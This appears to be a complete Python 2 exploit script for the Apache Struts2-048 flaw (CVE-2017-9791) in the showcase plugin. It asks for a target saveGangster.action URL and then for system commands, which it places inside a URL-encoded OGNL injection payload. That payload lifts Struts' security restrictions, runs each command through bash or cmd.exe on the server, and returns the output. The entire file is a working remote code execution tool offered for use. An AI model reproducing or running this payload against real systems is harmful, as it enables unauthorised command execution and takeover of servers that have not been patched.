#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Struts2-048(CVE-2017-9791) plugin showcase RCE exp
__author__ = '@S4kur4'
logo = "\033[1;34m"\
       "   _____ _              _       ___  \n"\
       "  / ____| |            | |     |__ \ \n"\
       " | (___ | |_ _ __ _   _| |_ ___   ) |\n"\
       "  \___ \| __| '__| | | | __/ __| / / \n"\
       "  ____) | |_| |  | |_| | |_\__ \/ /_ \n"\
       " |_____/ \__|_|   \__,_|\__|___/____|EXP\033[0m\n"\
       "  Author:\033[0;33mS4kur4\033[0m  Blog:\033[0;33mhttp://0x0c.cc\033[0m"

import urllib2
import sys
import optparse

headers = {
    "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Connection" : "keep-alive",
    "Accept" : "*/*",
    "X-Requested-With" : "XMLHttpRequest",
    "Accept-Encoding" : "deflate",
    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"
    }

def main():
    command = ""
    print logo
    parser = optparse.OptionParser('Usage: %prog [options]\nExample: %prog -u http://www.test.com/struts2-showcase/integration/saveGangster.action')
    parser.add_option('-u', '--url', dest='target_url', type='string', help='specify showcase plugin saveGangster.action URL')
    (options, args) = parser.parse_args()
    if options.target_url==None:
        parser.print_help()
        sys.exit(0)
    else:
        target_url = options.target_url
    target_url = target_url.rstrip('/')
    command = raw_input("\033[1;34m[*]\033[0m Input system command to execute or print 'q' to exit.\n\033[4mCommand\033[0m > ")
    while command != "q":
        ognldata = "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT"\
                   "_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23contai"\
                   "ner%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ogn"\
                   "lUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%2"\
                   "8%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClas"\
                   "ses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%"\
                   "27{}%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase"\
                   "%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2"\
                   "fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20"\
                   "java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23"\
                   "process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@ge"\
                   "tResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23"\
                   "process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=123&__cheack"\
                   "box_bustedBefore=true&description=123".format(command)
        try:
            request = urllib2.Request(url=target_url, data=ognldata, headers=headers)
            response = urllib2.urlopen(request)
            print response.read()
        except Exception, e:
            print "\033[1;31m[-]\033[0m Failed, maybe the site is not vulnerable."
            break
        command = raw_input("\n\033[4mCommand\033[0m > ")

if __name__ == '__main__':
    main()